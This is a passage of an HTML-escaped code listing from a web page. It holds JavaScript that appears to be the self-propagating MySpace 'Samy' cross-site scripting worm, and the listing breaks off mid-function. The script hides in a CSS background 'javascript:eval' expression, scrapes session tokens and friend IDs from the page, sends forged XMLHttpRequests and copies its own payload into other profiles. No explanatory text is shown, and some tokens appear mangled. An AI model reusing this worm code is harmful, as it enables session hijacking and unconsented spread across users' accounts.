class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div id=mycode style=”BACKGROUND: url(&amp;apos;javascript:eval(document.all.mycode.expr)&amp;apos;)” expr=”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var B = String.fromCharCode(34);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var A = String.fromCharCode(39);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function g() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var C;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var D = document.body.createTextRange(); C = D.htmlText&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; catch (e) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (C) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return C&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return eval(&amp;apos;document.body.innerHTML&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getFromURL(BF, BG) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var T;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (BG == &amp;apos;Mytoken&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        T = B&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        T = &amp;apos; &amp;amp; &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var U = BG + &amp;apos; = &amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var V = BF.indexOf(U) + U.length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var W = BF.substring(V, V + 1024);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var X = W.indexOf(T);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var Y = W.substring(0, X);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return Y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getData(AU) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    M = getFromURL(AU, &amp;apos;friendID&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    L = getFromURL(AU, &amp;apos;Mytoken&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getQueryParams() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var E = document.location.search;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var F = E.substring(1, E.length).split(&amp;apos; &amp;amp; &amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AS = new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (var O = 0; O &amp;lt; F.length; O++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var I = F[O].split(&amp;apos; = &amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        AS[I[0]] = I[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return AS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var J;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AS = getQueryParams();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var L = AS[&amp;apos;Mytoken&amp;apos;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var M = AS[&amp;apos;friendID&amp;apos;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (location.hostname == &amp;apos;profile.myspace.com&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    document.location&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        = &amp;apos;http: //www.myspace.com&amp;apos; + location.pathname + location.search&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (!M) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        getData(g())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getClientFID() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return findIn(g(), &amp;apos;up_launchIC(&amp;apos; + A, A)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function nothing() &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function paramsToString(AV) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var N = new String();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var O = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (var P in AV) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (O &amp;gt; 0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            N += &amp;apos; &amp;amp; &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var Q = escape(AV[P]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        while (Q.indexOf(&amp;apos; + &amp;apos;) != -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Q = Q.replace(&amp;apos; + &amp;apos;, &amp;apos; % 2B&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        while (Q.indexOf(&amp;apos; &amp;amp; &amp;apos;) != -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Q = Q.replace(&amp;apos; &amp;amp; &amp;apos;, &amp;apos; % 26&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        N += P + &amp;apos; = &amp;apos; + Q; O++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return N&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function httpSend(BH, BI, BJ, BK) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (!J) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    eval(&amp;apos;J.onr&amp;apos; + &amp;apos;eadystatechange = BI&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    J.open(BJ, BH, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (BJ == &amp;apos;POST&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        J.setRequestHeader(&amp;apos;Content - Type&amp;apos;, &amp;apos;application / x - www - form - urlencoded&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        J.setRequestHeader(&amp;apos;Content - Length&amp;apos;, BK.length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    J.send(BK); return true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function findIn(BF, BB, BC) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var R = BF.indexOf(BB) + BB.length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var S = BF.substring(R, R + 1024);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return S.substring(0, S.indexOf(BC))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getHiddenParameter(BF, BG) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return findIn(BF, &amp;apos;name = &amp;apos; + B + BG + B + &amp;apos;value = &amp;apos; + B, B)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getXMLObj() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var Z = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (window.XMLHttpRequest) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Z = new XMLHttpRe - quest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; catch(e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Z = false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; else if (window.ActiveXObject) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Z = new ActiveXOb - ject(&amp;apos;Msxml2.XMLHTTP&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; catch (e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                Z = new ActiveXOb - ject(&amp;apos;Microsoft.XMLHTTP&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; catch (e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                Z = false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return Z&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AA = g();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AB = AA.indexOf(&amp;apos;m&amp;apos; + &amp;apos;ycode&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AC = AA.substring(AB, AB + 4096);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AD = AC.indexOf(&amp;apos;D&amp;apos; + &amp;apos;IV&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AE = AC.substring(0, AD);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AF;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (AE) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AE = AE.replace(&amp;apos;jav&amp;apos; + &amp;apos;a&amp;apos;, A + &amp;apos;jav&amp;apos; + &amp;apos;a&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AE = AE.replace(&amp;apos;exp&amp;apos; + &amp;apos;r)&amp;apos;, &amp;apos;exp&amp;apos; + &amp;apos;r)&amp;apos; + A);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AF = &amp;apos;but most of all,samy is my hero. &amp;lt; d&amp;apos; + &amp;apos;iv id = &amp;apos; + AE + &amp;apos;D&amp;apos; + &amp;apos;IV &amp;gt; &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var AG;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getHome() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (J.readyState != 4) 